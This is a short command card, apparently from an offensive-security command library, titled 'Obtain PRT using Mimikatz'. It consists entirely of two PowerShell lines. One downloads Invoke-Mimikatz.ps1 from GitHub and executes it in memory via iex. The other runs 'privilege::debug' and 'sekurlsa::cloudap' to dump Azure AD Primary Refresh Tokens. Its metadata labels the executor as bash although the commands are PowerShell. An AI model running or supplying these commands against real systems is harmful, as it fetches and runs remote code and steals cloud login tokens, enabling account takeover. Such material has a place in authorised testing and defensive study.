---
id: 66ef163d-8d90-4c6a-9734-37152e8472c5
name: Obtain PRT using Mimikatz
type: command
executor: bash
data: 'PS> iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")

  PS> Invoke-Mimikatz -Command ''"privilege::debug" "sekurlsa::cloudap"'''
output: null
created_at: '2023-05-25T05:46:38.406770+00:00'
updated_at: '2023-05-25T07:04:18.489561+00:00'
---

# Obtain PRT using Mimikatz

```bash
PS> iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
PS> Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
```


